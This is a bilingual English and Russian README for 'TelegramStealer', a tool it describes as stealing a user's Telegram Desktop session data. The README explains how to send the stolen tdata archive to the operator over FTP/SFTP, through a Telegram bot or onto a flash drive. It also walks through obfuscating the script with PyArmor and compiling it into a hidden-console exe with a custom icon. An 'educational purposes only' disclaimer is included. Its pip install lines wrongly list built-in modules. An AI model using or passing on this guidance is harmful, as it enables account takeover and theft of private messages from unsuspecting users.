# 🇺🇸 | TelegramStealer
💬 I present to you a script that allows you to steal a session from a user in Telegram. Please note that this script only works if the user has Telegram Desktop.

📁 The folders are separated for your convenience. If you want to send the archived tdata file via SFTP/FTP server, please go to the FTP folder and fill in the sending details. If you prefer to receive data via telegram, go to the Telegram folder and enter the appropriate data. And if you prefer to export data to a flash drive, go to the "Flash" folder.

🛡️ IMPORTANT: THIS SCRIPT IS FOR EDUCATIONAL AND SECURITY TESTING PURPOSES ONLY!

⚠️ BEFORE USING THE SCRIPT, PLEASE NOTE THAT I, AS THE AUTHOR, ARE NOT RESPONSIBLE FOR YOUR ACTIONS. YOU USE IT AT YOUR OWN RISK!

🚫 REMEMBER THAT OBTAINING ACCESS TO A USER'S SESSION IS ILLEGAL AND PURPOSED BY LAW!

# Run the following command on the command line to install the library for Python, if you are going to send via FTP/SFTP server:
    pip install os platform pysftp ZipFile

# Run the following command on the command line to install the library for Python, if you are going to send via Telegram bot:
    pip install os telebot platform requests ZipFile

# Run the following command on the command line to install the Python library if you are going to export to a flash drive:
    pip install os shutil ZipFile

# How to create a bot in Telegram:
- Find the Telegram bot @BotFather in the search and start a dialogue with him by clicking the "Start" button.
- Write the /newbot command to create a new bot.
- Follow the instructions of BotFather, enter a name for your bot and get a unique username for it.

# To obfuscate and compile a Python file into an executable file (exe) using PyInstaller and add an icon, follow the instructions below:

1. Install PyInstaller and PyArmor if you don't already have it. You can install it using pip by running the following command:

         pip install pyinstaller pyarmor

2. Open a Command Prompt or Terminal and navigate to the directory where your Python file that you want to obfuscate is located.
         pyarmor obfuscate "path/to/your/script.py"

3. After running this command, PyArmor will obfuscate your Python file and create a dist folder.

4. You will need to go to the dist folder, open a Command Prompt or terminal and go to the directory where your Python file is located that you want to compile into an exe.

        pyinstaller -w -F --icon "path/to/your/icon.ico" "path/to/your/script.py"

         -w means that the console window will not be displayed at startup.
         -F tells pyInstaller to create a single executable file (exe).
         --icon "path/to/your/icon.ico" allows you to add an icon to your executable. Specify the path to your icon in .ico format.
         "path/to/your/script.py" - path to your Python file

5. After executing this command, PyInstaller will compile your Python file into an executable file (exe) with the specified icon.

# 🇷🇺 | TelegramStealer
💬 Представляю вам скрипт, который позволяет вам воровать сессию у пользователя в Telegram. Обратите внимание, что данный скрипт работает только при наличии Telegram Desktop у пользователя.

📁 Папки разделены для вашего удобства. Если вы хотите отправить архивированный файл tdata через SFTP/FTP сервер, перейдите в папку FTP и заполните данные для отправки. Если же вы предпочитаете получить данные через телеграмм, перейдите в папку Telegram и укажите соответствующие данные. А если вы предпочитаете экспортировать данные на флешку, перейдите в папку Flash.

🛡️ ВАЖНО: ДАННЫЙ СКРИПТ ПРЕДНАЗНАЧЕН ИСКЛЮЧИТЕЛЬНО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ И ТЕСТИРОВАНИЯ БЕЗОПАСНОСТИ!

⚠️ ПЕРЕД ИСПОЛЬЗОВАНИЕ СКРИПТА ОБРАТИТЕ ВНИМАНИЕ, ЧТО Я КАК АВТОР НЕ НЕСУ ОТВЕТСТВЕННОСТЬ ЗА ВАШИ ДЕЙСТВИЯ. ВЫ ИСПОЛЬЗУЕТЕ ЕГО НА СВОЙ СТРАХ И РИСК!

🚫 ПОМНИТЕ, ЧТО ПОЛУЧЕНИЕ ДОСТУПА К СЕССИИ ПОЛЬЗОВАТЕЛЯ ЯВЛЯЕТСЯ НЕЗАКОННЫМ И ПРЕСЛЕДУЕТСЯ ЗАКОНОМ!


# Выполните следующую команду в командной строке для установки библиотеки для Python, если вы собираетесь отправлять через FTP/SFTP сервер:
    pip install os platform pysftp ZipFile

# Выполните следующую команду в командной строке для установки библиотеки для Python, если вы собираетесь отправлять через бота Telegram:
    pip install os telebot platform requests ZipFile

# Выполните следующую команду в командной строке для установки библиотеки для Python, если вы собираетесь экспортировать на флешку:
    pip install os shutil ZipFile

# Как создать бота в Telegram:
- Найдите в поиске Telegram бота @BotFather и начните с ним диалог, нажав кнопку "Start".
- Напишите команду /newbot, чтобы создать нового бота.
- Следуйте инструкциям BotFather, введите имя для вашего бота и получите уникальное имя пользователя для него.
- Замените "YOUR_BOT_TOKEN_HERE" в скрипте на скопированный токен от BotFather.
- Замените "YOUR_ID_TELEGRAM" в скрипте на ваш ID Telegram.

# Для того чтобы обфусцировать и скомпилировать файл Python в исполняемый файл (exe) с помощью PyInstaller и добавить иконку, следуйте инструкциям ниже:

1. Установите PyInstaller и PyArmor, если у вас его еще нет. Вы можете установить его с помощью pip, выполнив следующую команду:

        pip install pyinstaller pyarmor

2. Откройте командную строку (Command Prompt) или терминал и перейдите в директорию, где находится ваш файл Python, который вы хотите обфусцировать.
        pyarmor obfuscate "path/to/your/script.py"

3. После выполнения этой команды PyArmor обфусцирует ваш файл Python и создастся папка dist.

4. Необходимо будет перейти в папку dist, открыть командную консоль (Command Prompt) или терминал и перейдите в директорию, где находится ваш файл Python, который вы хотите скомпилировать в exe.

       pyinstaller -w -F --icon "path/to/your/icon.ico" "path/to/your/script.py"

        -w означает, что консольное окно не будет отображаться при запуске.
        -F указывает pyInstaller создать один исполняемый файл (exe).
        --icon "path/to/your/icon.ico" позволяет добавить иконку к вашему исполняемому файлу. Укажите путь к вашей иконке в формате .ico.
        "path/to/your/script.py" - путь к Вашему файлу Python

5. После выполнения этой команды PyInstaller скомпилирует ваш файл Python в исполняемый файл (exe) с указанной иконкой.
